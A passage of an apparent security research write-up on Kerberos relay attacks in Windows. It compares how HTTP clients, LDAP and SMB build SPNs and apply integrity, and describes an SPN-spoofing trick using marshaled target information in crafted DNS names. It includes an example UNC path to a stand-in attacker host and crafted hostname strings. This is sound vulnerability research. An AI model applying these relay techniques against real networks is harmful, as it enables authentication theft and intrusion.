Kerberos directly like the .NET Framework, it does support passing an initial token so it&amp;#39;s still possible to force raw Kerberos which will disable the Integrity requirement.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c32\" id=\"h.9k5bin8hhfky\"&gt;&lt;span class=\"c31\"&gt;.NET 6.0&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The .NET 6.0 runtime is basically the same as .NET 5.0, except that Integrity is specified explicitly when creating the client authentication context. This means that rolling back to Kerberos no longer has any advantage. &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://github.com/dotnet/runtime/commit/17481fef502ee6aed6f9e8fc76e45bb5863c68b5\"&gt;This change&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;seems to be down to a broken implementation of NTLM on macOS and not as some anti-NTLM relay measure.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c32\" id=\"h.liq0ng1hwkl2\"&gt;&lt;span class=\"c31\"&gt;HTTP Overview&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;The following table summarizes the results of the HTTP protocol research:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c24 lst-kix_2yktnm17nyl7-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"c4\"&gt;LLMNR &lt;/span&gt;&lt;span&gt;column &lt;/span&gt;&lt;span class=\"c3\"&gt;indicates it&amp;#39;s possible to influence the SPN using a local DNS resolver attack &lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c4\"&gt;DNS CNAME&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;indicates a public DNS resolving attack &lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c4\"&gt;Delegation &lt;/span&gt;&lt;span class=\"c3\"&gt;indicates the HTTP user agent enables Kerberos delegation &lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c0 c18 li-bullet-0\"&gt;&lt;span class=\"c4\"&gt;Integrity &lt;/span&gt;&lt;span class=\"c3\"&gt;indicates that integrity protection is requested which reduces the usefulness of the relayed authentication if the target server automatically detects the setting.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.6768360573c54e4f01434a9fa509149b13842614\"&gt;&lt;/a&gt;&lt;a id=\"t.6\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c15 c33\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c25 c14 c4\"&gt;User Agent&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c29 c33\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c25 c14 c4\"&gt;LLMNR&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c30 c33\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c25 c14 c4\"&gt;DNS CNAME&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10 c33\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c25 c14 c4\"&gt;Delegation&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c22 c33\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;Integrity&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Internet Explorer 11 (WinINET)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c29\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c30\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c22\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;WebDAV (WinHTTP)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c29\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c30\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c22\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Chromium (M93)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c29\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c30\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;No&lt;/span&gt;&lt;span class=\"c25 c38\"&gt;&amp;dagger;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c22\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Firefox 91&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c29\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c30\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;No&lt;/span&gt;&lt;span class=\"c41\"&gt;&amp;dagger;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c22\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;.NET Framework 4.8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c29\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c30\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;No&lt;/span&gt;&lt;span class=\"c38 c25\"&gt;&amp;Dagger;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c22\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;.NET 5.0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c29\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c30\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c22\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;.NET 6.0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c29\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c30\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c22\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c3\"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;&amp;dagger; Chromium and Firefox can enable delegation only on a per-site basis through a GPO.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;&amp;Dagger; .NET Framework supports DNS resolving in special circumstances for non-dotted hostnames.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;By far the most permissive client is .NET 5.0. It supports authenticating to any host as long as it has been configured to authenticate automatically. It also supports arbitrary SPN spoofing from a public DNS name as well as disabling integrity through Kerberos fallback. However, as .NET 5.0 is designed to be something usable cross platform, it&amp;#39;s possible that few libraries written with it in mind will ever enable automatic authentication.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.ip4rfjjchenz\"&gt;&lt;span class=\"c6 c19\"&gt;LDAP&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Windows has a built-in general purpose LDAP library in &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/_ldap/\"&gt;wldap32.dll&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This is used by the majority of OS components when accessing Active Directory and is also used by the .NET &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection\"&gt;LdapConnection&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;class. There doesn&amp;#39;t seem to be a way of specifying the SPN manually for the LDAP connection using the API. Instead it&amp;#39;s built manually based on the canonical name based on the DNS lookup. Therefore it&amp;#39;s exploitable in a similar manner to &lt;/span&gt;&lt;span&gt;WinINET&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;via local DNS resolution.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;The name of the LDAP server can also be found by querying for a SRV record for the hostname. This is used to support accessing the LDAP server from the top-level Windows domain name. This will usually return an address record alongside, all this does is change the server resolution process which doesn&amp;#39;t seem to give any advantages to exploitation.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Whether the LDAP client enables integrity checking is based on the value of the &lt;/span&gt;&lt;span class=\"c4\"&gt;LDAP_OPT_SIGN&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag. As the connection only supports &lt;/span&gt;&lt;span class=\"c4\"&gt;Negotiate &lt;/span&gt;&lt;span&gt;authentication the client passes the &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_NO_INTEGRITY&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;flag if signing is disabled so that the server won&amp;#39;t accidentally auto-detect the signing capability enabled for the Negotiate MIC and accidentally enable signing protection.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;As part of &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a\"&gt;recent changes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to LDAP signing the client is forced to enable Integrity by the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-ldap-client-signing-requirements\"&gt;LdapClientIntegrity policy&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This means that regardless of whether the LDAP server needs integrity protection it&amp;#39;ll be enabled on the client which in turn will automatically enable it on the server. Changing the value of &lt;/span&gt;&lt;span class=\"c4\"&gt;LDAP_OPT_SIGN&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;in the client has no effect once this policy is enabled.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.m3ajz9uje54l\"&gt;&lt;span class=\"c6 c19\"&gt;SMB&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;SMB is one of the most commonly exploited protocols for NTLM relay, as it&amp;#39;s easy to convert access to a file into authentication. It would be convenient if it was also exploitable for Kerberos relay. While SMBv1 is deprecated and not even installed on newer installs of Windows, it&amp;#39;s still worth looking at the implementation of v1 and v2 to determine if either are exploitable.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The client implementations of SMB 1 and 2 are in &lt;/span&gt;&lt;span class=\"c4\"&gt;mrxsmb10.sys&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c4\"&gt;mrxsmb20.sys&lt;/span&gt;&lt;span&gt;&amp;nbsp;respectively with some common code in &lt;/span&gt;&lt;span class=\"c4\"&gt;mrxsmb.sys&lt;/span&gt;&lt;span&gt;. Both protocols support specifying a name for the SPN which is related to DFS. The SPN name needs to be specified through the &lt;/span&gt;&lt;span class=\"c4\"&gt;GUID_ECP_DOMAIN_SERVICE_NAME_CONTEXT&lt;/span&gt;&lt;span&gt;&amp;nbsp;ECP and is only enabled if the &lt;/span&gt;&lt;span class=\"c4\"&gt;NETWORK_OPEN_ECP_OUT_FLAG_RET_MUTUAL_AUTH &lt;/span&gt;&lt;span&gt;flag in the &lt;/span&gt;&lt;span class=\"c4\"&gt;GUID_ECP_NETWORK_OPEN_CONTEXT &lt;/span&gt;&lt;span class=\"c3\"&gt;ECP (set by MUP) is specified. This is related to UNC hardening which was added to protect things like group policies.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;It&amp;#39;s easy enough to trigger the conditions to set the &lt;/span&gt;&lt;span class=\"c4\"&gt;NETWORK_OPEN_ECP_OUT_FLAG_RET_MUTUAL_AUTH&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag. The default UNC hardening rules always add SYSVOL and NETLOGON UNC paths with a wildcard hostname. Therefore a request to &lt;/span&gt;&lt;span class=\"c4\"&gt;\\\\evil.com\\SYSVOL&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;will cause the flag to be set and the SPN potentially overridable. The server should be a DFS server for this to work, however even with the flag set I&amp;#39;ve not found a way of setting an arbitrary SPN value remotely.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Even if you could spoof the SPN, the SMB clients always enable Integrity protection. Like LDAP, SMB will enable signing and encryption opportunistically if available from the client, unless UNC hardening measures are in place.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.kia6c4byjbr3\"&gt;&lt;span class=\"c6 c19\"&gt;Marshaled Target Information SPN&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;While investigating the SMB implementation I noticed something interesting. The SMB clients use the function &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-secmakespnex2\"&gt;SecMakeSPNEx2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to build the SPN value from the service class and name. You might assume this would just return the SPN as-is, however that&amp;#39;s not the case. Instead for the hostname of &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver &lt;/span&gt;&lt;span&gt;with the service class &lt;/span&gt;&lt;span class=\"c4\"&gt;cifs&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;you get back an SPN which looks like the following:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.0468306ab73a53f6535ab8bb12a4cae517044efb\"&gt;&lt;/a&gt;&lt;a id=\"t.7\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2 c4\"&gt;cifs/fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Looking at the implementation of &lt;/span&gt;&lt;span class=\"c4\"&gt;SecMakeSPNEx2&lt;/span&gt;&lt;span&gt;&amp;nbsp;it makes a call to the API function &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/nf-ntsecpkg-credmarshaltargetinfo\"&gt;CredMarshalTargetInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This API takes a list of target information in a &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credential_target_informationw\"&gt;CREDENTIAL_TARGET_INFORMATION&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;structure and marshals it using a base64 string encoding. This marshaled string is then appended to the end of the real SPN.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The code is therefore just appending some additional target information to the end of the SPN, presumably so it&amp;#39;s easier to pass around. My initial assumption would be this information is stripped off before passing to the SSPI APIs by the SMB client. However, passing this SPN value to &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;as the target name succeeds and gets a Kerberos service ticket for &lt;/span&gt;&lt;span class=\"c4\"&gt;cifs/fileserver&lt;/span&gt;&lt;span class=\"c3\"&gt;. How does that work?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Inside the function &lt;/span&gt;&lt;span class=\"c4\"&gt;SspiExProcessSecurityContext &lt;/span&gt;&lt;span&gt;in &lt;/span&gt;&lt;span class=\"c4\"&gt;lsasrv.dll&lt;/span&gt;&lt;span&gt;, which is the main entrypoint of &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext, &lt;/span&gt;&lt;span&gt;there&amp;#39;s a call to the &lt;/span&gt;&lt;span class=\"c4\"&gt;CredUnmarshalTargetInfo &lt;/span&gt;&lt;span&gt;API, which parses the marshaled target information. However &lt;/span&gt;&lt;span class=\"c4\"&gt;SspiExProcessSecurityContext &lt;/span&gt;&lt;span class=\"c3\"&gt;doesn&amp;#39;t care about the unmarshalled results, instead it just gets the length of the marshaled data and removes that from the end of the target SPN string. Therefore before the Kerberos package gets the target name it has already been restored to the original SPN.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The encoded SPN shown earlier, minus the service class, is a valid DNS component name and therefore could be used as the hostname in a public or local DNS resolution request. This is interesting as this potentially gives a way of spoofing a hostname which is distinct from the real target service, but when processed by the SSPI API requests the spoofed service ticket. As in if you use the string &lt;/span&gt;&lt;span class=\"c42 c4\"&gt;fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA&lt;/span&gt;&lt;span&gt;&amp;nbsp;as the DNS name, and if the client appends a service class to the name and passes it to SSPI it will get a service ticket for &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver&lt;/span&gt;&lt;span class=\"c3\"&gt;, however the DNS resolving can trivially return an unrelated IP address.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;There are some big limitations to abusing this behavior. The marshaled target information must be valid, the last 6 characters is an encoded length of the entire marshaled buffer and the buffer is prefixed with a 28 byte header with a magic value of 0x91856535 in the first 4 bytes. If this length is invalid (e.g. larger than the buffer or not a multiple of 2) or the magic isn&amp;#39;t present then the &lt;/span&gt;&lt;span class=\"c4\"&gt;CredUnmarshalTargetInfo &lt;/span&gt;&lt;span&gt;call fails and &lt;/span&gt;&lt;span class=\"c4\"&gt;SspiExProcessSecurityContext&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;leaves the SPN as is which will subsequently fail to query a Kerberos ticket for the SPN.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;The easiest way that the name could be invalid is by it being converted to lowercase. DNS is case insensitive, however generally the servers are case preserving. Therefore you could lookup the case sensitive name and the DNS server would return that unmodified. However the HTTP clients tested all seem to lowercase the hostname before use, therefore by the time it&amp;#39;s used to build an SPN it&amp;#39;s now a different string. When unmarshalling &amp;#39;a&amp;#39; and &amp;#39;A&amp;#39; represent different binary values and so parsing of the marshaled information will fail.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Another issue is that the size limit of a single name in DNS is 63 characters. The minimum valid marshaled buffer is 44 characters long leaving only 19 characters for the SPN part. This is at least larger than the minimum NetBIOS name limit of 15 characters so as long as there&amp;#39;s an SPN for that shorter name registered it should be sufficient. However if there&amp;#39;s no short SPN name registered then it&amp;#39;s going to be more difficult to exploit.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;In theory you could specify the SPN using its FQDN. However it&amp;#39;s hard to construct such a name. The length value must be at the end of the string and needs to be a valid marshaled value so you can&amp;#39;t have any dots within its 6 characters. It&amp;#39;s possible to have a TLD which is 6 characters or longer and as the embedded marshaled values are not escaped this can be used to construct a valid FQDN which would then resolve to another SPN target. For example:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.18557f87bd0691805cf0d36ab288c563e4a9d02e\"&gt;&lt;/a&gt;&lt;a id=\"t.8\"&gt;&lt;/a&gt;&lt;table class=\"c21\"&gt;&lt;tbody&gt;&lt;tr class=\"c20\"&gt;&lt;td class=\"c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2 c4\"&gt;fileserver1UWhRCAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAA.domain.oBAAAA&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;is a valid DNS name which would resolve to an SPN for &lt;/span&gt;&lt;span class=\"c4\"&gt;fileserver&lt;/span&gt;&lt;span&gt;. Except that &lt;/span&gt;&lt;span class=\"c4\"&gt;oBAAAA&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not a valid public TLD. Pulling the list of &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://data.iana.org/TLD/tlds-alpha-by-domain.txt\"&gt;valid TLDs&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from ICANN&amp;#39;s website and converting all values which are 6 characters or longer into the expected length value, the smallest length which is a multiple of 2 is from &lt;/span&gt;&lt;span class=\"c4\"&gt;WEBCAM&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;which results in a DNS name at least 264331 characters long, which is somewhat above the 255 character limit usually considered valid for a FQDN in DNS.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p 